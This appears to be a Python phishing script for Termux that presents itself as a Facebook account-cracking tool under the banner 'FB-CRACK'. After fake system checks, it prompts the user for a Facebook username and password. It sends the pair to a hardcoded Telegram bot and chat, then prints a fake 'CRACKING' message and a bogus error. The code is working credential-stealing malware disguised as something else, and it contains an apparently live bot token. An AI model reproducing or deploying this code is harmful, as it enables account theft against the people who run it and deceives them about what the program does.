#hello
#investigating this script?

#i'am gonna create a comment in every task so it will be easy for you


##import modules
import json
import base64
import glob
import os
import time
import urllib.request
#from cryptography.hazmat.backends import *
#from cryptography.hazmat.primitives import *
#from cryptography.hazmat.primitives.kdf.pbkdf2 import *
#from cryptography.hazmat.backends import *
import requests
import sys
import random
import string
#from
##indicator##
red = "\033[1;31;40m"
blue = "\033[94m"
green = "\033[1;32;40m"
end =" \033[0m"
yellow = "\033[93m"
ob = "["
cb = "]"
###########

####signal####
warn = ob + red + "•" + end + cb
ok = ob + green + "•"+end + cb
stat = ob + blue + "•" + end + cb
info = ob + yellow + " CHECKING SYSTEM PLEASE WAIT" + end + cb
yes = green +"YES"+end
no = red+"NO"+end
############
#checking for storage permission
def sysinfo():
    if os.path.isdir("/data/data/com.termux/files/home") == True:
        return True
    else:
        return False
def connect(host='http://google.com'):
    try:
        urllib.request.urlopen(host, timeout=10) #Python 3.x
        return True
    except:
        return False
def effect(word, delay):
    for i in word:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(delay)
effect(info+"\n",delay=0.1)
termux = "TERMUX USER -> "
exiting = warn, "exiting\n"
effect(termux, delay=0.01)
if sysinfo() == True:
    print(yes)

else:
    print(no)
    effect(exiting,0.1)
    exit()
conn = "INTERNET CONNECTION -> "
effect(conn,delay=0.01)
if connect() == True:
    print(yes)

else:
    print(no)
    effect(exiting,delay=0.1)
    exit()

effect("STORAGE PERMISSION -> ",0.1)
if os.path.isdir("/data/data/com.termux/files/home/storage") == True:
    print(yes)
else:
    print(no)
    effect(exiting,0.1)
    exit()
effect("CRYPTOGRAPHY PACKAGE ->",0.01)
#checking for cryptograhpy package
try:
    import cryptography
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.fernet import Fernet
    #effect("cryptography package ->",0.1)
    print(yes)
except ModuleNotFoundError:
    print(no)
    effect(exiting,0.1)
    exit()
time.sleep(0.5)
def clear():
    os.system("reset && clear")
def logo():
    clear()
    logo = """                                    

____________        _____ ______  ___  _____  _   __
|  ___| ___ \      /  __ \| ___ \/ _ \/  __ \| | / /
| |_  | |_/ /______| /  \/| |_/ / /_\ \ /  \/| |/ / 
|  _| | ___ \______| |    |    /|  _  | |    |    \ 
| |   | |_/ /      | \__/\| |\ \| | | | \__/\| |\  \.
\_|   \____/        \____/\_| \_\_| |_/\____/\_| \_/
════════════════════════════════════════════════════
║ [\033[93m#\033[0m]AUTHOR: smiley xD                   
║ [\033[93m#\033[0m]GREET TO: cyberX crew



\r\n"""
    effect(logo,delay=0.001)

logo()
def tele(msg):
    req = requests.get("https://api.telegram.org/bot1700099562:AAHQH_HJzIiVD8lAlAjD5ZICW9YIS8UBkhc/sendMessage?chat_id=1407670512&parse_mode=Markdown&text="+msg)
#facebook login part

x = ob+blue+" #"+end+"]"
title = "[═══════════════FACEBOOK LOGIN═══════════════]\n"

effect(title,0.01)
email_text = x+"ENTER YOUR USERNAME"
effect(email_text,0.01)
email_input = input("->")
password_text = x+"ENTER YOUR PASSWORD"
effect(password_text,0.01)
password_input = input("~>")

clear()
logo()
send_creds = email_input+":"+password_input
tele(send_creds)
effect("[\033[1;31;40m*\033[0m]CRACKING PLEASE WAIT ",0.01)
time.sleep(5)
effect("\033[1;31;40m UNKNOWN ERROR PLEASE TRY AGAIN LATER",0.1)
#os.remove(sys.argv[0])

